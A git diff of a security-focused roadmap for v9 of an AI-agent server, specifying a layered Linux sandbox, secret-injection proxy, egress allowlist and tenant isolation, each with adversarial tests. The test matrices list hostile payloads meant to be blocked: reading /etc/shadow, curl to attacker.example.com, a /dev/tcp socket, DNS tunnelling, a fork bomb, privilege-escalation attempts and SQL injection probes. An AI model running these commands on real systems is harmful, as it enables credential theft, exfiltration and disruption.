@@ -627,11 +627,20 @@ v9 is **the trust gate.** No further versions ship until every P0 is real code w
 
 ### Smallest Useful Version
 
-A v9.0 release where: (a) the binary ships with **real** Linux sandboxing wired to `ProcessExecutor` or the sandbox claim is removed everywhere, (b) the **Credential Request** out-of-band deposit flow is live end-to-end (new table, tool, API, dedicated deposit UI), (c) session tokens have TTL + refresh + revocation + a users/roles table with at least `admin | operator | viewer`, and (d) a rebuilt UI surfaces the event-timeline, the budget burndown, and the credential-request inbox. P1 observability items (search, export, cost reports, retention) ship as v9.1. P2 items (multi-tenant, tool catalog, Ollama bullet, version handshake, terminology pass) ship as v9.2 or are explicitly deferred to v10.
+A v9.0 release where: (a) the binary ships with **industry-leading** Linux agent sandboxing (Bubblewrap + seccomp-bpf + landlock + per-agent network namespace with egress allowlist + cgroup v2 limits + `no_new_privs`) wired to `ProcessExecutor`, plus a **Secret Injection Proxy** so plaintext credentials never enter the agent process memory, (b) the **Credential Request** out-of-band deposit flow is live end-to-end, (c) session tokens have TTL + refresh + revocation with a users/roles table (`admin | operator | viewer`), (d) **real workspace-scoped multi-tenant enforcement** on every endpoint with cross-tenant isolation tests, and (e) a rebuilt HTMX + Pico UI surfaces event-timeline, budget burndown, credential-request inbox, and workspace switcher. P1 observability items (search, export, cost reports, retention) ship as v9.1. P2 polish items (tool catalog, Ollama bullet, version handshake, terminology pass) ship as v9.2.
 
 ### Acceptance Criteria
 
-- **AC-53** (Sandbox Truth — kill the marketing lie): Exactly one of the following is true and asserted by test. **Option A**: every shell tool call on Linux runs inside a Bubblewrap + seccomp-bpf-based sandbox (the Zerobox primitive) that the `ProcessExecutor` invokes via a new `SandboxedExecutor`; an adversarial test `tests/sandbox_escape_test.rs` runs three payloads (`cat /etc/shadow`, `curl attacker.example.com`, `ls /host`) inside the sandbox and asserts all three fail. **Option B**: every occurrence of the words `zerobox`, `Zerobox`, `greywall`, `Greywall`, `sandbox`, and `isolation` in `README.md`, `preferences.md`, `DELIVERY.md`, the landing-page HTML, and the CLI `--help` output is replaced with the literal phrase `process-level hardening (not container isolation)`; a `tests/no_sandbox_lie_test.rs` grep-lint enforces this. The repository MUST NOT merge both paths simultaneously. Verified by the adversarial test *or* the lint test, selected by `SANDBOX_MODE=real|disabled` in scope.
+- **AC-53** (Industry-Leading Agent Sandbox — Zerobox real): Every shell tool call on Linux runs inside a layered sandbox implemented in a new `src/runtime/sandbox/` module that the `ProcessExecutor` invokes via `SandboxedExecutor`. The sandbox composes ALL of the following layers; any layer missing causes the sandbox to refuse to start:
+
+  1. **Process isolation**: Bubblewrap wrapper with a new user + PID + mount + UTS + IPC + cgroup namespace per tool call. `--unshare-all --die-with-parent`.
+  2. **Filesystem isolation**: read-only root filesystem bind-mount, per-call tmpfs overlay for writable paths, explicit landlock LSM ruleset (`landlock_create_ruleset` + `landlock_restrict_self`) denying all paths except the per-call tmpfs and the tool's declared allowlist.
+  3. **Syscall filter**: seccomp-bpf **allowlist** (not denylist) pinned to a vetted profile at `profiles/sandbox/seccomp.json`. Blocks `ptrace`, `mount`, `clone` with unsafe flags, `kexec_*`, `bpf`, `userfaultfd`, `unshare` with `CLONE_NEWUSER` post-entry, and the rest of the kernel attack surface.
+  4. **Privilege lockdown**: `no_new_privs=1`, all capabilities dropped (`CAP_*` = 0), uid/gid mapped to a non-root ephemeral subuid.
+  5. **Network isolation**: per-call network namespace with **default-deny** egress; only destinations declared in `agent_network_allowlist` (AC-72) reach the outside via a userspace proxy (slirp4netns or equivalent). Outbound attempts to non-allowlisted hosts emit a `network_blocked` event and fail.
+  6. **Resource limits**: cgroup v2 enforced — `memory.max=512M`, `pids.max=64`, `cpu.max=100000 100000` (1 CPU), `io.max` writeback cap per-call (all configurable via `OPEN_PINCERY_SANDBOX_*`).
+
+  An adversarial test suite `tests/sandbox_escape_test.rs` runs a **minimum 12-payload matrix** across 4 categories, and every payload MUST fail: **(FS escape)** `cat /etc/shadow`, `ls /host/proc/1/root`, symlink-race TOCTOU, `dd if=/dev/mem`; **(Network exfil)** `curl attacker.example.com`, DNS tunnel via `nslookup`, `exec 3<>/dev/tcp/8.8.8.8/53`; **(Privilege escalation)** `setuid` binary exec, `ptrace` attach to host pid 1, `capset` attempt, `unshare --user`; **(Resource exhaustion)** fork bomb, 10 GB `malloc`. Each failure MUST emit a `sandbox_blocked` event containing `{payload_category, syscall_or_path, denied_by_layer}` observable in the event log. The marketing words `zerobox` and `greywall` are acceptable ONLY when the full test matrix passes on the CI Linux runner; a CI job `ci/sandbox-integrity.yml` fails the build if the suite regresses.
 
 - **AC-54** (Security Threat Model): `docs/SECURITY.md` exists and is linked from `README.md`. It contains four sections with minimum content: **(1) Adversary capabilities** (what a malicious prompt / compromised LLM / compromised tool output can do), **(2) In-scope attacks** (at least: prompt-injection exfil, tool-sandbox escape, credential leak via event log, session hijack, webhook replay), **(3) Out-of-scope** (at least: compromised host, compromised Postgres, insider with DB credentials), **(4) Disclosure**: a working email address + PGP key fingerprint OR a GitHub Security Advisories link. A CI test `tests/security_doc_test.rs` asserts all four sections are present by regex.
 
@@ -655,7 +664,7 @@ A v9.0 release where: (a) the binary ships with **real** Linux sandboxing wired 
 
 - **AC-64** (Event Retention + Export-Then-Prune): A new background job (configurable via `OPEN_PINCERY_RETENTION_DAYS`, default `unlimited`) can prune events older than N days — but only after they are written to an append-only gzipped JSONL archive directory (`OPEN_PINCERY_ARCHIVE_DIR`). A CLI `pcy events archive --older-than 90d --dry-run` reports what would be archived; without `--dry-run` it performs the archive + prune transaction. The archive is **never** deleted by Pincery. Verified by `tests/event_retention_test.rs`: seed old events, run archive, assert rows deleted + archive file contains identical JSONL.
 
-- **AC-65** (Multi-Tenant Declaration): `DELIVERY.md` and `README.md` gain a bold "**Multi-Tenant Support**" section that either (a) declares "Pincery is single-tenant per deployment; running a SaaS requires one deployment per customer" with a link to a future v12 multi-tenant roadmap, OR (b) ships `workspace_memberships` enforcement on every API endpoint with `tests/multi_tenant_test.rs` asserting cross-workspace isolation for events, agents, credentials, and sessions. v9 picks (a) unless (b) is explicitly selected during DESIGN. Verified by `tests/multi_tenant_declaration_test.rs`: the section exists with the exact heading and at least one of the two contracts is fulfilled.
+- **AC-65** (Multi-Tenant Enforcement — real isolation): Every domain row carries `workspace_id` (already present on `agents`, `events`, `credentials`, `prompt_templates`, `wake_summaries`, `llm_calls`, `tool_audit`; added via migration to `sessions`, `credential_requests`, `agent_http_allowlist`, `agent_network_allowlist`). Every API handler resolves the caller's `workspace_id` from the session and injects it into every Postgres query as a mandatory `WHERE workspace_id = $1` predicate enforced by a new `src/tenancy.rs` middleware — **no handler constructs SQL without going through the scoped-pool helper**. A `tests/multi_tenant_isolation_test.rs` seeds two workspaces (`alpha`, `beta`) each with their own user, agent, credential, event, credential-request, and session; then exercises a **5×5 matrix** (5 resource types × 5 HTTP verbs: GET list, GET detail, POST, PATCH, DELETE) using alpha's session token against beta's resource IDs and asserts every one of the 25 requests returns HTTP 404 (never 403 — 403 leaks existence). A second test asserts that database queries run with alpha's workspace context cannot see beta rows even via raw SQL injection probes (single-quote, UNION, comment-terminated). `DELIVERY.md` and `README.md` gain a bold "**Multi-Tenant Support**" section documenting the model: one deployment, N workspaces, hard isolation. Verified by the isolation matrix + the SQLi probe test + a lint `tests/tenancy_middleware_test.rs` that greps `src/api/` for any `sqlx::query` call not originating from the scoped helper.
 
 - **AC-66** (Tool Catalog Expansion): In addition to `shell` and `list_credentials`, ship at least: `http_get(url, headers?)` (with per-agent allowlist from a new `agent_http_allowlist` table), `file_read(path)` (scoped to a per-agent writable tempdir, no host FS access), `db_query(connection_name, sql)` (uses a stored credential, read-only enforced by server-side regex). Each new tool has its own integration test asserting the scoping rule. Verified by `tests/tool_catalog_test.rs`: four tools present in the runtime's tool list, each has a passing scoping test.
 
@@ -667,16 +676,26 @@ A v9.0 release where: (a) the binary ships with **real** Linux sandboxing wired 
 
 - **AC-70** (Terminology Lock): The README's opening paragraph declares the canonical vocabulary: "A **pincer** is a single continuous AI agent. **Pincery** is the server + CLI that hosts them. `pcy` is the CLI binary." A new lint `tests/terminology_test.rs` asserts that in `README.md`, `DELIVERY.md`, and `docs/api.md`, the words `bot`, `assistant`, and `worker` are never used as synonyms for `pincer` (verified by regex with an explicit allowlist for unrelated contexts like "chatbot" in citations).
 
+- **AC-71** (Secret Injection Proxy — Zerobox core): Plaintext credentials **never enter the agent process address space**. A new `src/runtime/secret_proxy.rs` runs as a server-side component with exclusive read access to the vault key. When a tool call contains `PLACEHOLDER:<name>` tokens, the agent process forwards the raw request (with placeholders intact) to the secret proxy over a unix-domain socket; the proxy decrypts the secret, performs substitution, and either (a) writes the substituted value directly to the sandboxed child's stdin pipe, (b) injects it as an env var on the sandboxed `exec` call (visible only inside the sandbox, via `/proc/self/environ` of the child), or (c) for `http_get` tools, makes the outbound HTTP call itself and returns only the response body to the agent. The agent process's `/proc/self/environ`, heap, and stack never contain the plaintext. Adversarial test `tests/secret_proxy_test.rs`: (1) trigger a tool call that resolves `PLACEHOLDER:OPENAI_API_KEY`, then dump the agent process's memory via `/proc/<agent_pid>/maps` + `pread` and assert the key-bytes are not present; (2) trigger the same call and assert the sandboxed child DID see the value (correctness); (3) assert a `secret_injected` event is emitted with `{name, tool_name, injection_mode}` but never the value.
+
+- **AC-72** (Per-Agent Network Egress Allowlist): A new migration creates `agent_network_allowlist (id uuid pk, agent_id uuid fk, host_pattern text, protocol text check (protocol in ('tcp','udp')), port integer, created_at timestamptz)`. When the sandbox (AC-53) starts a tool call, it reads the agent's allowlist and configures the network namespace's userspace proxy (slirp4netns) to permit ONLY those `(host_pattern, protocol, port)` tuples. Any attempted egress to a non-allowlisted destination is dropped at the proxy layer and a `network_blocked` event is emitted with `{destination_host, destination_port, protocol, tool_name}`. CLI: `pcy agent network allow <agent> <host>:<port>/<proto>`, `pcy agent network list <agent>`, `pcy agent network revoke <allowlist_id>`. UI: agent-detail page shows the allowlist with add/remove. Adversarial test `tests/network_egress_test.rs`: seed an agent with allowlist `[("api.openai.com", "tcp", 443)]`, execute a tool that curls `https://api.openai.com` (expect success) and a tool that curls `http://attacker.example.com` (expect blocked + `network_blocked` event).
+
 ### Stack
 
-No new core runtime dependencies beyond what's in v8. The following are added and pinned:
+No new core Rust runtime dependencies beyond what's in v8. The following system binaries and Rust crates are added and pinned:
 
-| Concern                          | Choice                           | Why                                                             |
-| -------------------------------- | -------------------------------- | --------------------------------------------------------------- |
-| Linux sandboxing (AC-53 Option A) | `bubblewrap` (system binary) + seccomp-bpf profile | Mature, battle-tested (used by Flatpak), zero new Rust deps |
-| UI framework (AC-61)             | HTMX 1.9 + Pico.css              | Zero-build, ships as ~15KB; no npm pipeline to maintain         |
-| Retention archive format (AC-64) | gzipped JSONL, one file per day  | Trivially greppable, resumable, matches event-log schema        |
-| Session cookie signing (AC-58)   | Existing vault key (reused)      | No new key-management surface                                   |
+| Concern                          | Choice                                                                  | Why                                                             |
+| -------------------------------- | ----------------------------------------------------------------------- | --------------------------------------------------------------- |
+| Linux process sandbox (AC-53)    | `bubblewrap` system binary                                              | Battle-tested (Flatpak), zero new Rust deps                     |
+| Syscall filter (AC-53)           | `libseccomp` + Rust `seccompiler` crate                                 | Kernel-enforced allowlist, mature                               |
+| Filesystem LSM (AC-53)           | `landlock` crate (Rust bindings) — kernel ≥5.13                         | Unprivileged per-process FS confinement                         |
+| Network namespace proxy (AC-53/AC-72) | `slirp4netns` system binary                                        | Userspace TCP/UDP; enforces egress allowlist without root       |
+| Cgroup v2 limits (AC-53)         | Direct `/sys/fs/cgroup` writes via `cgroups-rs` crate                   | No new daemon required                                          |
+| Secret injection IPC (AC-71)     | Unix-domain socket, length-prefixed JSON                                | Zero new crates; simple, auditable                              |
+| UI framework (AC-61)             | HTMX 1.9 + Pico.css (vendored, no CDN)                                  | Zero-build; ships ~15KB; no npm                                 |
+| Retention archive (AC-64)        | gzipped JSONL, one file per day                                         | Greppable, resumable, schema-aligned                            |
+| Session cookie signing (AC-58)   | Existing vault key (reused)                                             | No new key-management surface                                   |
+| Tenancy enforcement (AC-65)      | New `src/tenancy.rs` scoped-query helper; lint blocks bypass            | Middleware pattern; auditable via grep                          |
 
 ### Deployment Target
 
@@ -686,20 +705,22 @@ Unchanged: single Rust binary + PostgreSQL + static assets. The only new operati
 
 New tables:
 
-- `credential_requests (id, agent_id, name, reason, doc_url, status, deposit_token, deposit_token_expires_at, created_at, fulfilled_at, fulfilled_by)` — AC-55
-- `agent_http_allowlist (id, agent_id, host_pattern, created_at)` — AC-66
+- `credential_requests (id, agent_id, workspace_id, name, reason, doc_url, status, deposit_token, deposit_token_expires_at, created_at, fulfilled_at, fulfilled_by)` — AC-55, AC-65
+- `agent_http_allowlist (id, agent_id, workspace_id, host_pattern, created_at)` — AC-66, AC-65
+- `agent_network_allowlist (id, agent_id, workspace_id, host_pattern, protocol, port, created_at)` — AC-72, AC-65
 
 New columns on existing tables:
 
 - `sessions.expires_at timestamptz not null` — AC-58
 - `sessions.last_used_at timestamptz` — AC-58
+- `sessions.workspace_id uuid not null` — AC-65 (backfilled from the owning user's default workspace)
 - `users.role text not null default 'admin'` — AC-59
 
 New event types on `events.event_type`:
 
 - `credential_requested` (AC-55), `credential_deposited` (AC-56), `credential_request_rejected` (AC-57)
 - `rate_limit_exceeded` (AC-67)
-- `sandbox_blocked` (AC-53 Option A)
+- `sandbox_blocked` (AC-53), `network_blocked` (AC-72), `secret_injected` (AC-71)
 
 No destructive schema changes. Every migration is forward-only and additive.
 
@@ -711,34 +732,37 @@ $0 incremental — no new infrastructure required beyond what v8 already uses. T
 
 **House** — production-facing trust gate. REVIEW and RECONCILE are mandatory on every AC. Every P0 AC (AC-53 through AC-61) requires an adversarial test, not just a happy-path test. v9 is the version that decides whether Pincery is a prototype or a product.
 
-### Clarifications Needed
+### Clarifications Resolved (2026-04-22, user directive)
 
-1. **AC-53 Option A vs Option B.** Wiring real Bubblewrap sandboxing is 1-2 weeks of engineering with adversarial testing; removing the marketing claim is a day. The solo founder's explicit ask is "don't release until all this is shipped" — interpreting that as Option A. If budget is tight, Option B + a "v10 will ship real sandboxing" commitment is defensible. **Default: Option A. Confirm before DESIGN begins.**
-2. **AC-61 UI stack.** HTMX + Pico is zero-build and ships today; Preact + Tailwind is more capable but adds a committed build artifact. **Default: HTMX + Pico** for the zero-build property. The UI rebuild ships six views; additional polish (animations, charts beyond sparklines) is v10.
-3. **AC-65 multi-tenant.** True multi-tenant enforcement touches every endpoint and is easily 2 weeks alone. **Default: ship the explicit single-tenant declaration (option a)** and sequence real multi-tenant as v12. The solo founder's use case is one deployment, one workspace — single-tenant is correct for now.
-4. **AC-59 roles granularity.** Three roles (admin/operator/viewer) is the SMB baseline. Adding custom roles / ABAC / scoped tokens is v11. Confirm three is enough.
+1. **AC-53 — Industry-leading agent sandbox (locked).** User: *"Real sandboxes, full robust, industry leading security model for agentic software."* → Option A chosen and **strengthened** beyond baseline Bubblewrap. Final spec layers Bubblewrap + seccomp-bpf allowlist + landlock LSM + per-call network namespace + cgroup v2 limits + `no_new_privs` + `CAP_*=0`, plus AC-71 Secret Injection Proxy and AC-72 Per-Agent Network Egress Allowlist as first-class ACs. Adversarial test matrix expanded from 3 payloads to 12 across 4 categories.
+2. **AC-61 — HTMX + Pico (locked).** User: *"htmx+pico seems fine since its all one container."* → HTMX 1.9 + Pico.css, vendored (no CDN), zero build pipeline.
+3. **AC-65 — Real multi-tenant enforcement (locked, upgraded from declaration).** User: *"i think we need to design the multitenant feature."* → Upgraded from option (a) declaration to option (b) enforcement. Every API endpoint scoped by `workspace_id` via a mandatory `src/tenancy.rs` middleware; 5×5 cross-workspace isolation matrix test; SQLi probe test; lint blocks bypass. Adds ~2 weeks to v9 — user-approved.
+4. **AC-59 — Fixed three roles (locked).** User: *"fixed 3 is fine."* → `admin | operator | viewer` shipped in v9; custom roles / ABAC deferred to v11.
 
 ### Deferred to v10+
 
-- **SaaS control plane** (self-service signup, per-tenant billing, invite flows, password reset). v9 ships the RBAC primitive; the SaaS skin is v12.
+- **SaaS control plane** (self-service signup, per-tenant billing, invite flows, password reset). v9 ships the RBAC primitive AND real workspace isolation; the SaaS skin on top is v12.
 - **Prompt template editor UI.** Schema exists; v9 ships the event-timeline and credential-inbox views first. Template editor = v10.
 - **Real SSE/WebSocket event streaming** (AC-62 uses bounded polling). Pair with v11 signals primitive.
-- **Zerobox on macOS (Seatbelt) / Windows.** v9 AC-53 Option A is Linux-only. Cross-platform sandboxing = v12.
+- **Zerobox on macOS (Seatbelt) / Windows.** v9 AC-53 is Linux-only by design (landlock + cgroup v2 + network namespaces are Linux-kernel primitives). Cross-platform sandboxing = v12.
 - **Custom roles / ABAC.** v9 AC-59 ships fixed admin/operator/viewer. Custom roles = v11.
 - **MCP stdio server** (was deferred from v8.1). Pair with v11 signals.
 - **pgvector / CozoDB memory** (was v8+ north-star). v9 is security + trust gate only.
+- **Sandbox hardening beyond the v9 baseline**: gVisor / Kata containers as opt-in alternative backends = v12.
 
 ### v9 Build Order
 
 The order is sequenced so each slice gates the next and every slice is independently committable + verifiable.
 
-**Phase A — Security Truth (P0, ~1-2 weeks)**
+**Phase A — Security Truth (P0, ~3-4 weeks — now the largest phase)**
 
 1. **Slice A1 — AC-54 Threat Model + SECURITY.md**: writes the truth about what v8 actually protects. Ships first because every subsequent slice is scoped by this document. (1 day)
-2. **Slice A2 — AC-53 Sandbox Truth**: default Option A (real Bubblewrap + seccomp). Highest risk slice — may need to fall back to Option B if the adversarial test can't be stabilized in time. (3-5 days)
-3. **Slice A3 — AC-58 Session TTL + Refresh + Revocation**: no new features blocked by it — can ship parallel to A2. (1-2 days)
-4. **Slice A4 — AC-59 Users + Roles**: depends on A3's session machinery. (2-3 days)
-5. **Slice A5 — AC-60 Auth README Rewrite**: documentation commit. (½ day)
+2. **Slice A2a — AC-53 Sandbox core**: Bubblewrap + seccomp-bpf allowlist + `no_new_privs` + capability drop + cgroup v2 limits + landlock FS confinement. 4 adversarial payload categories (FS, privesc, resource) green. (5-7 days)
+3. **Slice A2b — AC-72 Per-agent network egress allowlist**: new table + network namespace wiring + slirp4netns proxy + `network_blocked` event + CLI `agent network {allow,list,revoke}`. Network-exfil payload category of AC-53's matrix goes green on this slice. (3-4 days)
+4. **Slice A2c — AC-71 Secret Injection Proxy**: `src/runtime/secret_proxy.rs` with unix-socket IPC; agent process memory sweep test; `secret_injected` event. (3-4 days)
+5. **Slice A3 — AC-58 Session TTL + Refresh + Revocation**: may ship parallel to A2a/b/c. (1-2 days)
+6. **Slice A4 — AC-59 Users + Roles**: depends on A3. (2-3 days)
+7. **Slice A5 — AC-60 Auth README Rewrite**: documentation commit. (½ day)
 
 **Phase B — Credential Requests (P0, ~1 week)**
 
@@ -756,16 +780,22 @@ The order is sequenced so each slice gates the next and every slice is independe
 11. **Slice D2 — AC-63 Cost Reports**: grouping API + UI chart. (1-2 days)
 12. **Slice D3 — AC-64 Retention + Archive**: background job + CLI. (2 days)
 
-**Phase E — Multi-tenant + Tool Catalog + Polish (P2, ~1 week)**
+**Phase E — Multi-Tenant Enforcement (P0 upgraded, ~2 weeks — now blocking v9.0)**
 
-13. **Slice E1 — AC-65 Multi-Tenant Declaration**: doc commit selecting option (a). (½ day)
-14. **Slice E2 — AC-66 Tool Catalog Expansion**: http_get + file_read + db_query with scoping tests. (3 days)
-15. **Slice E3 — AC-67 Workspace Rate Limiting**: config + enforcement + event emission. (1 day)
-16. **Slice E4 — AC-68 Ollama Bullet**: README + test. (½ day)
-17. **Slice E5 — AC-69 Version Handshake**: `/api/version` + CLI mismatch warning. (1 day)
-18. **Slice E6 — AC-70 Terminology Lock**: README rewrite + lint test. (½ day)
+13. **Slice E1a — AC-65 schema**: add `workspace_id` to `sessions`, `credential_requests`, `agent_http_allowlist`, `agent_network_allowlist`; backfill. (2 days)
+14. **Slice E1b — AC-65 middleware**: `src/tenancy.rs` scoped-pool helper; lint test blocks bare `sqlx::query` in handlers. (2 days)
+15. **Slice E1c — AC-65 endpoint migration**: every handler in `src/api/` refactored to use the scoped helper. (4-5 days)
+16. **Slice E1d — AC-65 isolation matrix test**: 5×5 cross-workspace test + SQLi probes + middleware lint. (2 days)
 
-**Total estimate: 4-6 weeks of focused engineering at one-slice-per-day cadence.** No version ships before Phase A + B are complete (these are the trust gate). Phase C ships as v9.0. Phases D + E ship as v9.1 and v9.2 incrementally, each gated by its own REVIEW + VERIFY.
+**Phase F — Tool Catalog + Polish (P1/P2, ~1 week, ships as v9.1)**
+
+17. **Slice F1 — AC-66 Tool Catalog Expansion**: http_get + file_read + db_query with scoping tests. (3 days)
+18. **Slice F2 — AC-67 Workspace Rate Limiting**: config + enforcement + event emission. (1 day)
+19. **Slice F3 — AC-68 Ollama Bullet**: README + test. (½ day)
+20. **Slice F4 — AC-69 Version Handshake**: `/api/version` + CLI mismatch warning. (1 day)
+21. **Slice F5 — AC-70 Terminology Lock**: README rewrite + lint test. (½ day)
+
+**Total estimate: 7-9 weeks of focused engineering at one-slice-per-day cadence** (was 4-6; multi-tenant enforcement + secret proxy + egress allowlist + expanded sandbox matrix add ~3 weeks, user-approved). v9.0 ships only after Phases A + B + C + E are complete (security truth + credential requests + UI + tenancy = the full trust gate). Phase D (observability) ships as v9.1. Phase F (polish) ships as v9.2.
 
 ### v9 Dependencies on Prior Versions
 
@@ -780,4 +810,4 @@ None broken.
 
 ### Why v9 Is Worth a Whole Version
 
-A product that says "sandboxed" in marketing but runs `sh` is not a security product. A product where the agent can leak a secret into the event log is not a secrets product. A product where sessions never expire is not an auth product. v9 is the version that lets the solo founder look their CTO / their board / their first enterprise customer in the eye and say "yes, we sandbox; yes, secrets are isolated; yes, sessions rotate; yes, we have RBAC." Every AC above is a specific claim with a specific test. If any AC ships with placeholder behaviour, the version fails.
+A product that says "sandboxed" in marketing but runs `sh` is not a security product. A product where the agent can leak a secret into the event log is not a secrets product. A product where sessions never expire is not an auth product. A product where "workspaces" are just a column with no enforcement is not a multi-tenant product. v9 is the version that lets the solo founder look their CTO / their board / their first enterprise customer in the eye and say: *yes, we sandbox agents at the kernel level with six independent layers; yes, plaintext credentials never enter the agent process; yes, every agent has a declared network egress allowlist enforced at the namespace layer; yes, sessions rotate with TTL and refresh; yes, we have RBAC; yes, workspaces are hard-isolated with a kernel-tested middleware and a 5×5 cross-tenant test matrix.* Every AC above is a specific claim with a specific adversarial test. If any P0 AC ships with placeholder behaviour, the version fails and does not release.
